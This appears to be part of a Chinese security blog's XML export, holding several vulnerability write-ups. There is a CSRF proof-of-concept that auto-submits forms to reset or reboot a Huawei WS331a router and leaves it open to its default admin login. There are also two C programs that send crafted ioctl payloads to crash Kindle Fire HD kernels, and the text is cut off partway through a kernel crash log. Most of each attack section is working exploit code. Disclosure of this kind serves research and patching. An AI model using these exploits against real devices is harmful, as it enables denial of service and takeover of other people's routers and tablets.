    <content><![CDATA[<h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>HuaweiWS331a是中国华为（Huawei）公司的一款迷你无线路由器。使用WS331a-10V100R001C01B112之前版本软件的HuaweiWS331a路由器的管理界面存在跨站请求伪造漏洞。远程攻击者可通过提交特制的请求利用该漏洞恢复出厂设置或重启设备。</p>
<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>WS331a-10 V100R001C02B017SP01及之前版本</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="POC实现代码如下："><a href="#POC实现代码如下：" class="headerlink" title="POC实现代码如下："></a>POC实现代码如下：</h3><blockquote>
<p>当管理员登陆后，打开如下poc页面，WS331a设备将重启。</p>
</blockquote>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://192.168.3.1/api/service/reboot.cgi&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"> <span class="built_in">document</span>.forms[<span class="number">0</span>].submit(); </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>当管理员登陆后，打开如下poc页面，WS331a设备将恢复初始化配置。设备自动重启后不需要密码即可连接热点，并使用amdin/admin对设备进行管理控制。</p>
</blockquote>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://192.168.3.1/api/service/restoredefcfg.cgi&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"> <span class="built_in">document</span>.forms[<span class="number">0</span>].submit(); </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>IOT</category>
      </categories>
      <tags>
        <tag>IOT</tag>
        <tag>Huawei</tag>
      </tags>
  </entry>
  <entry>
    <title>（CVE-2018-11021）Amazon Kindle Fire HD (3rd) Fire OS kernel组件安全漏洞</title>
    <url>/2020/09/12/IOT/Exploit/Amazon%20Kindle%20Fire%20HD(3rd)/%EF%BC%88CVE-2018-11021%EF%BC%89Amazon-Kindle-Fire-HD-3rd-Fire-OS-kernel%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><blockquote>
<p>Amazon Kindle Fire HD（3rd）Fire OS 4.5.5.3内核组件中的内核模块/omap/drivers/video/omap2/dsscomp/device.c允许攻击者通过设备/ dev上ioctl的参数注入特制参数/ dsscomp与命令<strong>1118064517</strong>并导致内核崩溃。</p>
<p>要探索此漏洞，必须打开设备文件/ dev / dsscomp，并使用命令<strong>1118064517</strong>和精心设计的有效负载作为第三个参数在此设备文件上调用ioctl系统调用。</p>
</blockquote>
<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Fire OS 4.5.5.3</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>poc</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * This is poc of Kindle Fire HD 3rd</span></span><br><span class="line"><span class="comment"> * A bug in the ioctl interface of device file /dev/dsscomp causes the system crash via IOCTL 1118064517.</span></span><br><span class="line"><span class="comment"> * Related buggy struct name is dsscomp_setup_dispc_data.</span></span><br><span class="line"><span class="comment"> * This Poc should run with permission to do ioctl on /dev/dsscomp.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">static</span> <span class="keyword">char</span> *driver = <span class="string">&quot;/dev/dsscomp&quot;</span>;</span><br><span class="line"><span class="keyword">static</span> command = <span class="number">1118064517</span>; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **env)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> payload[] = &#123;</span><br><span class="line">    <span class="number">0xffffffff</span>,</span><br><span class="line">    <span class="number">0x00000003</span>,</span><br><span class="line">    <span class="number">0x5d200040</span>,</span><br><span class="line">    <span class="number">0x79900008</span>,</span><br><span class="line">    <span class="number">0x8f5928bd</span>,</span><br><span class="line">    <span class="number">0x78b02422</span>,</span><br><span class="line">    <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0xffffffff</span>,</span><br><span class="line">    <span class="number">0xf4c50400</span>,</span><br><span class="line">    <span class="number">0x007fffff</span>,</span><br><span class="line">    <span class="number">0x8499f562</span>,</span><br><span class="line">    <span class="number">0xffff0400</span>,</span><br><span class="line">    <span class="number">0x001b131d</span>,</span><br><span class="line">    <span class="number">0x60818210</span>,</span><br><span class="line">    <span class="number">0x00000007</span>,</span><br><span class="line">    <span class="number">0xffffffff</span>,</span><br><span class="line">    <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x9da9041c</span>,</span><br><span class="line">    <span class="number">0xcd980400</span>,</span><br><span class="line">    <span class="number">0x001f03f4</span>,</span><br><span class="line">    <span class="number">0x00000007</span>,</span><br><span class="line">    <span class="number">0x2a34003f</span>,</span><br><span class="line">    <span class="number">0x7c80d8f3</span>,</span><br><span class="line">    <span class="number">0x63102627</span>,</span><br><span class="line">    <span class="number">0xc73643a8</span>,</span><br><span class="line">    <span class="number">0xa28f0665</span>,</span><br><span class="line">    <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x689e57b4</span>,</span><br><span class="line">    <span class="number">0x01ff0008</span>,</span><br><span class="line">    <span class="number">0x5e7324b1</span>,</span><br><span class="line">    <span class="number">0xae3b003f</span>,</span><br><span class="line">    <span class="number">0x0b174d86</span>,</span><br><span class="line">    <span class="number">0x00000400</span>,</span><br><span class="line">    <span class="number">0x21ffff37</span>,</span><br><span class="line">    <span class="number">0xceb367a4</span>,</span><br><span class="line">    <span class="number">0x00000040</span>,</span><br><span class="line">    <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0xec000f9e</span>,</span><br><span class="line">    <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0x000001ff</span>,</span><br><span class="line">    <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x0000000f</span>,</span><br><span class="line">    <span class="number">0x0425c069</span>,</span><br><span class="line">    <span class="number">0x038cc3be</span>,</span><br><span class="line">    <span class="number">0x0000000f</span>,</span><br><span class="line">    <span class="number">0x00000080</span>,</span><br><span class="line">    <span class="number">0xe5790100</span>,</span><br><span class="line">    <span class="number">0x5b1bffff</span>,</span><br><span class="line">    <span class="number">0x0000d355</span>,</span><br><span class="line">    <span class="number">0x0000c685</span>,</span><br><span class="line">    <span class="number">0xa0070000</span>,</span><br><span class="line">    <span class="number">0x0010ffff</span>,</span><br><span class="line">    <span class="number">0x00a0ff00</span>,</span><br><span class="line">    <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0xff490700</span>,</span><br><span class="line">    <span class="number">0x0832ad03</span>,</span><br><span class="line">    <span class="number">0x00000006</span>,</span><br><span class="line">    <span class="number">0x00000002</span>,</span><br><span class="line">    <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0x81f871c0</span>,</span><br><span class="line">    <span class="number">0x738019cb</span>,</span><br><span class="line">    <span class="number">0xbf47ffff</span>,</span><br><span class="line">    <span class="number">0x00000040</span>,</span><br><span class="line">    <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0x7f190f33</span>,</span><br><span class="line">    <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0x8295769b</span>,</span><br><span class="line">    <span class="number">0x0000003f</span>,</span><br><span class="line">    <span class="number">0x869f2295</span>,</span><br><span class="line">    <span class="number">0xffffffff</span>,</span><br><span class="line">    <span class="number">0xd673914f</span>,</span><br><span class="line">    <span class="number">0x05055800</span>,</span><br><span class="line">    <span class="number">0xed69b7d5</span>,</span><br><span class="line">    <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x0107ebbd</span>,</span><br><span class="line">    <span class="number">0xd214af8d</span>,</span><br><span class="line">    <span class="number">0xffff4a93</span>,</span><br><span class="line">    <span class="number">0x26450008</span>,</span><br><span class="line">    <span class="number">0x58df0000</span>,</span><br><span class="line">    <span class="number">0xd16db084</span>,</span><br><span class="line">    <span class="number">0x03ff30dd</span>,</span><br><span class="line">    <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0x209aff3b</span>,</span><br><span class="line">    <span class="number">0xe7850800</span>,</span><br><span class="line">    <span class="number">0x00000002</span>,</span><br><span class="line">    <span class="number">0x30da815c</span>,</span><br><span class="line">    <span class="number">0x426f5105</span>,</span><br><span class="line">    <span class="number">0x0de109d7</span>,</span><br><span class="line">    <span class="number">0x2c1a65fc</span>,</span><br><span class="line">    <span class="number">0xfcb3d75f</span>,</span><br><span class="line">    <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0x8066be5b</span>,</span><br><span class="line">    <span class="number">0x00000002</span>,</span><br><span class="line">    <span class="number">0xffffffff</span>,</span><br><span class="line">    <span class="number">0x5cf232ec</span>,</span><br><span class="line">    <span class="number">0x680d1469</span>,</span><br><span class="line">    <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0x00000020</span>,</span><br><span class="line">    <span class="number">0xffffffff</span>,</span><br><span class="line">    <span class="number">0x00000400</span>,</span><br><span class="line">    <span class="number">0xd1d12be8</span>,</span><br><span class="line">    <span class="number">0x02010200</span>,</span><br><span class="line">    <span class="number">0x01ffc16f</span>,</span><br><span class="line">    <span class="number">0xf6e237e6</span>,</span><br><span class="line">    <span class="number">0x007f0000</span>,</span><br><span class="line">    <span class="number">0x01ff08f8</span>,</span><br><span class="line">    <span class="number">0x000f00f9</span>,</span><br><span class="line">    <span class="number">0xbad07695</span>,</span><br><span class="line">    <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0xbaff0000</span>,</span><br><span class="line">    <span class="number">0x24040040</span>,</span><br><span class="line">    <span class="number">0x00000006</span>,</span><br><span class="line">    <span class="number">0x00000004</span>,</span><br><span class="line">    <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0xbc2e9242</span>,</span><br><span class="line">    <span class="number">0x009f5f08</span>,</span><br><span class="line">    <span class="number">0x00800000</span>,</span><br><span class="line">    <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0xff8800ff</span>,</span><br><span class="line">    <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x000003f4</span>,</span><br><span class="line">    <span class="number">0x6faa8472</span>,</span><br><span class="line">    <span class="number">0x00000400</span>,</span><br><span class="line">    <span class="number">0xec857dd5</span>,</span><br><span class="line">    <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x00000040</span>,</span><br><span class="line">    <span class="number">0xffffffff</span>,</span><br><span class="line">    <span class="number">0x3f004874</span>,</span><br><span class="line">    <span class="number">0x0000b77a</span>,</span><br><span class="line">    <span class="number">0xec9acb95</span>,</span><br><span class="line">    <span class="number">0xfacc0001</span>,</span><br><span class="line">    <span class="number">0xffff0001</span>,</span><br><span class="line">    <span class="number">0x0080ffff</span>,</span><br><span class="line">    <span class="number">0x3600ff03</span>,</span><br><span class="line">    <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0x8fff7d7f</span>,</span><br><span class="line">    <span class="number">0x6b87075a</span>,</span><br><span class="line">    <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x41414141</span>,</span><br><span class="line">    <span class="number">0x41414141</span>,</span><br><span class="line">    <span class="number">0x41414141</span>,</span><br><span class="line">    <span class="number">0x41414141</span>,</span><br><span class="line">    <span class="number">0x001001ff</span>,</span><br><span class="line">    <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0xff1f0512</span>,</span><br><span class="line">    <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0x51e32167</span>,</span><br><span class="line">    <span class="number">0xc18c55cc</span>,</span><br><span class="line">    <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0xffffffff</span>,</span><br><span class="line">    <span class="number">0xb4aaf12b</span>,</span><br><span class="line">    <span class="number">0x86edfdbd</span>,</span><br><span class="line">    <span class="number">0x00000010</span>,</span><br><span class="line">    <span class="number">0x0000003f</span>,</span><br><span class="line">    <span class="number">0xabff7b00</span>,</span><br><span class="line">    <span class="number">0xffff9ea3</span>,</span><br><span class="line">    <span class="number">0xb28e0040</span>,</span><br><span class="line">    <span class="number">0x000fffff</span>,</span><br><span class="line">    <span class="number">0x458603f4</span>,</span><br><span class="line">    <span class="number">0xffff007f</span>,</span><br><span class="line">    <span class="number">0xa9030f02</span>,</span><br><span class="line">    <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0x002cffff</span>,</span><br><span class="line">    <span class="number">0x9e00cdff</span>,</span><br><span class="line">    <span class="number">0x00000004</span>,</span><br><span class="line">    <span class="number">0x41414141</span>,</span><br><span class="line">    <span class="number">0x41414141</span>,</span><br><span class="line">    <span class="number">0x41414141</span>,</span><br><span class="line">    <span class="number">0x41414141</span> &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> fd = <span class="number">0</span>;</span><br><span class="line">        fd = open(driver, O_RDWR);</span><br><span class="line">        <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Failed to open %s, with errno %d\n&quot;</span>, driver, errno);</span><br><span class="line">            system(<span class="string">&quot;echo 1 &gt; /data/local/tmp/log&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Try open %s with command 0x%x.\n&quot;</span>, driver, command);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;System will crash and reboot.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(ioctl(fd, command, &amp;payload) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Allocation of structs failed, %d\n&quot;</span>, errno);</span><br><span class="line">            system(<span class="string">&quot;echo 2 &gt; /data/local/tmp/log&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="崩溃日志"><a href="#崩溃日志" class="headerlink" title="崩溃日志"></a>崩溃日志</h2><blockquote>
<p>To be added here.</p>
</blockquote>
]]></content>
      <categories>
        <category>IOT</category>
      </categories>
      <tags>
        <tag>IOT</tag>
        <tag>Amazon</tag>
      </tags>
  </entry>
  <entry>
    <title>（CVE-2018-11023）Amazon Kindle Fire HD (3rd) Fire OS kernel组件安全漏洞</title>
    <url>/2020/09/12/IOT/Exploit/Amazon%20Kindle%20Fire%20HD(3rd)/%EF%BC%88CVE-2018-11023%EF%BC%89Amazon-Kindle-Fire-HD-3rd-Fire-OS-kernel%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><hr>
<blockquote>
<p>Amazon Kindle Fire HD（3rd）Fire OS 4.5.5.3的内核组件中的内核模块/omap/drivers/misc/gcx/gcioctl/gcif.c允许攻击者通过设备/ dev上ioctl的参数注入特制参数/ gcioctl使用命令3222560159，并导致内核崩溃。</p>
</blockquote>
<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Fire OS 4.5.5.3</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>poc：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * This is poc of Kindle Fire HD 3rd</span></span><br><span class="line"><span class="comment"> * A bug in the ioctl interface of device file /dev/gcioctl causes the system crash via IOCTL 3222560159. </span></span><br><span class="line"><span class="comment"> * This Poc should run with permission to do ioctl on /dev/gcioctl.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">static</span> <span class="keyword">char</span> *driver = <span class="string">&quot;/dev/gcioctl&quot;</span>;</span><br><span class="line"><span class="keyword">static</span> command = <span class="number">3222560159</span>; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **env)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> payload[] = &#123; <span class="number">0x244085aa</span>, <span class="number">0x1a03e6ef</span>, <span class="number">0x000003f4</span>, <span class="number">0x00000000</span> &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> fd = <span class="number">0</span>;</span><br><span class="line">        </span><br><span class="line">        fd = open(driver, O_RDONLY);</span><br><span class="line">        <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Failed to open %s, with errno %d\n&quot;</span>, driver, errno);</span><br><span class="line">            system(<span class="string">&quot;echo 1 &gt; /data/local/tmp/log&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Try open %s with command 0x%x.\n&quot;</span>, driver, command);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;System will crash and reboot.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(ioctl(fd, command, &amp;payload) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Allocation of structs failed, %d\n&quot;</span>, errno);</span><br><span class="line">            system(<span class="string">&quot;echo 2 &gt; /data/local/tmp/log&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="崩溃日志"><a href="#崩溃日志" class="headerlink" title="崩溃日志"></a>崩溃日志</h2><blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[   79.825592] init: untracked pid 3232 exited</span><br><span class="line">[   79.830841] init: untracked pid 3234 exited</span><br><span class="line">[   95.970855] Alignment trap: not handling instruction e1953f9f at [&lt;c06a4d84&gt;]</span><br><span class="line">[   95.978912] Unhandled fault: alignment exception (0x001) at 0x1a03e6f3</span><br><span class="line">[   95.986053] Internal error: : 1 [#1] PREEMPT SMP ARM</span><br><span class="line">[   95.991638] Modules linked in: omaplfb(O) pvrsrvkm(O) pvr_logger(O)</span><br><span class="line">[   95.999145] CPU: 0    Tainted: G           O  (3.4.83-gd2afc0bae69 #1)</span><br><span class="line">[   96.006408] PC is at __raw_spin_lock_irqsave+0x38&#x2F;0xb0</span><br><span class="line">[   96.012115] LR is at _raw_spin_lock_irqsave+0x10&#x2F;0x14</span><br><span class="line">[   96.017791] pc : [&lt;c06a4d88&gt;]    lr : [&lt;c06a4e10&gt;]    psr: 20000093</span><br><span class="line">[   96.017822] sp : d02bfdd8  ip : d02bfdf8  fp : d02bfdf4</span><br><span class="line">[   96.030578] r10: 00000000  r9 : dd3eeca8  r8 : 00000001</span><br><span class="line">[   96.036376] r7 : 1a03e6ef  r6 : 00000001  r5 : 1a03e6f3  r4 : d02be000</span><br><span class="line">[   96.043701] r3 : 00000001  r2 : 00000001  r1 : 00000082  r0 : 20000013</span><br><span class="line">[   96.050933] Flags: nzCv  IRQs off  FIQs on  Mode SVC_32  ISA ARM  Segment user</span><br><span class="line">[   96.058990] Control: 10c5387d  Table: 96cb804a  DAC: 00000015</span><br><span class="line">[   96.065460] </span><br><span class="line">[   96.065460] PC: 0xc06a4d08:</span><br><span class="line">[   96.070404] 4d08  1a000003 eaffffe6 e5903000 e3530000 0affffe3 e5903004 e3530000 1afffff9</span><br><span class="line">[   96.080810] 4d28  eaffffdf e50b0018 ebfffbab e51b0018 eaffffed e1a0c00d e92dd800 e24cb004</span><br><span class="line">[   96.091217] 4d48  ebffffcf e89da800 e1a0c00d e92dd878 e24cb004 e1a0300d e3c34d7f e3c4403f</span><br><span class="line">[   96.101776] 4d68  e1a05000 e3a06001 e5943004 e2833001 e5843004 e10f0000 f10c0080 e1953f9f</span><br><span class="line">[   96.112335] 4d88  e3330000 01853f96 e3530000 0a000014 e121f000 e5943004 e2433001 e5843004</span><br><span class="line">[   96.122894] 4da8  e5943000 e3130002 1a000010 e5953004 e3530000 e5953000 05856004 e3530000</span><br><span class="line">[   96.133361] 4dc8  1a000003 eaffffe7 e5953000 e3530000 0affffe4 e5953004 e3530000 1afffff9</span><br><span class="line">[   96.143920] 4de8  eaffffe0 f57ff05f e5853004 e89da878 ebfffb79 eaffffec e1a0c00d e92dd800</span><br><span class="line">[   96.154479] </span><br><span class="line">[   96.154479] LR: 0xc06a4d90:</span><br><span class="line">[   96.159393] 4d90  e3530000 0a000014 e121f000 e5943004 e2433001 e5843004 e5943000 e3130002</span><br><span class="line">[   96.170013] 4db0  1a000010 e5953004 e3530000 e5953000 05856004 e3530000 1a000003 eaffffe7</span><br><span class="line">[   96.180603] 4dd0  e5953000 e3530000 0affffe4 e5953004 e3530000 1afffff9 eaffffe0 f57ff05f</span><br><span class="line">[   96.191070] 4df0  e5853004 e89da878 ebfffb79 eaffffec e1a0c00d e92dd800 e24cb004 ebffffcf</span><br><span class="line">[   96.201690] 4e10  e89da800 e1a0c00d e92dd800 e24cb004 ebfffff6 e89da800 e1a0c00d e92dd800</span><br><span class="line">[   96.212341] 4e30  e24cb004 ebfffff1 e89da800 e1a0c00d e92dd818 e24cb004 ebffffc0 e1a04000</span><br><span class="line">[   96.222808] 4e50  ebe6a978 e121f004 e89da818 e1a0c00d e92dd800 e24cb004 ebfffff3 e89da800</span><br><span class="line">[   96.233612] 4e70  e1a0c00d e92dd830 e24cb004 e24dd008 e1a0300d e3c34d7f e3c4403f e3a05001</span><br><span class="line">[   96.244262] </span><br><span class="line">[   96.244262] SP: 0xd02bfd58:</span><br><span class="line">[   96.249145] fd58  00000000 0000001d 00000004 d4736f80 d4737394 c06a4d84 20000093 ffffffff</span><br><span class="line">[   96.259948] fd78  d02bfdc4 00000001 d02bfdf4 d02bfd90 c06a5318 c0008370 20000013 00000082</span><br><span class="line">[   96.270660] fd98  00000001 00000001 d02be000 1a03e6f3 00000001 1a03e6ef 00000001 dd3eeca8</span><br><span class="line">[   96.281311] fdb8  00000000 d02bfdf4 d02bfdf8 d02bfdd8 c06a4e10 c06a4d88 20000093 ffffffff</span><br><span class="line">[   96.292053] fdd8  0000020a 00000082 1a03e6f3 d02be000 d02bfe04 d02bfdf8 c06a4e10 c06a4d5c</span><br><span class="line">[   96.302825] fdf8  d02bfe14 d02bfe08 c06a4e24 c06a4e0c d02bfe5c d02bfe18 c06a3008 c06a4e20</span><br><span class="line">[   96.313415] fe18  d84a38d8 d84a2800 d84a3800 0000000a d02be000 c33a3180 d02bfe54 1a03e6ef</span><br><span class="line">[   96.323883] fe38  bed24608 d02be000 d627f000 bed24608 dd3eeca8 00000000 d02bfe6c d02bfe60</span><br><span class="line">[   96.334533] </span><br><span class="line">[   96.334533] IP: 0xd02bfd78:</span><br><span class="line">[   96.339416] fd78  d02bfdc4 00000001 d02bfdf4 d02bfd90 c06a5318 c0008370 20000013 00000082</span><br><span class="line">[   96.349853] fd98  00000001 00000001 d02be000 1a03e6f3 00000001 1a03e6ef 00000001 dd3eeca8</span><br><span class="line">[   96.360290] fdb8  00000000 d02bfdf4 d02bfdf8 d02bfdd8 c06a4e10 c06a4d88 20000093 ffffffff</span><br><span class="line">[   96.370727] fdd8  0000020a 00000082 1a03e6f3 d02be000 d02bfe04 d02bfdf8 c06a4e10 c06a4d5c</span><br><span class="line">[   96.381042] fdf8  d02bfe14 d02bfe08 c06a4e24 c06a4e0c d02bfe5c d02bfe18 c06a3008 c06a4e20</span><br><span class="line">[   96.391479] fe18  d84a38d8 d84a2800 d84a3800 0000000a d02be000 c33a3180 d02bfe54 1a03e6ef</span><br><span class="line">[   96.402008] fe38  bed24608 d02be000 d627f000 bed24608 dd3eeca8 00000000 d02bfe6c d02bfe60</span><br><span class="line">[   96.412445] fe58  c06a319c c06a2fec d02bff04 d02bfe70 c0317c28 c06a3194 00000001 00000028</span><br><span class="line">[   96.422790] </span><br><span class="line">[   96.422790] FP: 0xd02bfd74:</span><br><span class="line">[   96.427795] fd74  ffffffff d02bfdc4 00000001 d02bfdf4 d02bfd90 c06a5318 c0008370 20000013</span><br><span class="line">[   96.438140] fd94  00000082 00000001 00000001 d02be000 1a03e6f3 00000001 1a03e6ef 00000001</span><br><span class="line">[   96.448699] fdb4  dd3eeca8 00000000 d02bfdf4 d02bfdf8 d02bfdd8 c06a4e10 c06a4d88 20000093</span><br><span class="line">[   96.459289] fdd4  ffffffff 0000020a 00000082 1a03e6f3 d02be000 d02bfe04 d02bfdf8 c06a4e10</span><br><span class="line">[   96.470031] fdf4  c06a4d5c d02bfe14 d02bfe08 c06a4e24 c06a4e0c d02bfe5c d02bfe18 c06a3008</span><br><span class="line">[   96.480438] fe14  c06a4e20 d84a38d8 d84a2800 d84a3800 0000000a d02be000 c33a3180 d02bfe54</span><br><span class="line">[   96.490875] fe34  1a03e6ef bed24608 d02be000 d627f000 bed24608 dd3eeca8 00000000 d02bfe6c</span><br><span class="line">[   96.501495] fe54  d02bfe60 c06a319c c06a2fec d02bff04 d02bfe70 c0317c28 c06a3194 00000001</span><br><span class="line">[   96.512023] </span><br><span class="line">[   96.512023] R4: 0xd02bdf80:</span><br><span class="line">[   96.517089] df80  000003ef 61ef22a8 61ef2278 61ef22d8 00000036 c0013e08 00000000 d02bdfa8</span><br><span class="line">[   96.527679] dfa0  c0013c60 c0136578 61ef22a8 61ef2278 0000000a c0186201 65490ce8 65490ce0</span><br><span class="line">[   96.538208] dfc0  61ef22a8 61ef2278 61ef22d8 00000036 00000001 65393000 6253ab8c 4010f2ec</span><br><span class="line">[   96.548797] dfe0  00000001 65490cd0 400f0273 400e3804 600f0010 0000000a 5788f1b0 0000000b</span><br><span class="line">[   96.559356] e000  00000002 00000003 00000000 d4736f80 c0a0e840 00000000 00000015 c4fcf880</span><br><span class="line">[   96.569885] e020  00000000 d02be000 c09ddc50 d4736f80 dd0be600 c1617b40 d02bfdf4 d02bfd40</span><br><span class="line">[   96.580535] e040  c06a36e4 00000000 00000000 00000000 00000000 00000000 01000000 00000000</span><br><span class="line">[   96.591125] e060  005bc4c0 5ebfea7f 00000000 00000000 00000000 00000000 00000000 00000000</span><br><span class="line">[   96.601684] </span><br><span class="line">[   96.601684] R9: 0xdd3eec28:</span><br><span class="line">[   96.606628] ec28  dd3eec28 dd3eec28 00000000 00000000 00000000 c06bc674 000200da c09dda58</span><br><span class="line">[   96.617218] ec48  00000000 00000000 dd3eec50 dd3eec50 00000000 c0aa5174 c0aa5174 c0aa5148</span><br><span class="line">[   96.627716] ec68  5aefd4d7 00000000 00000000 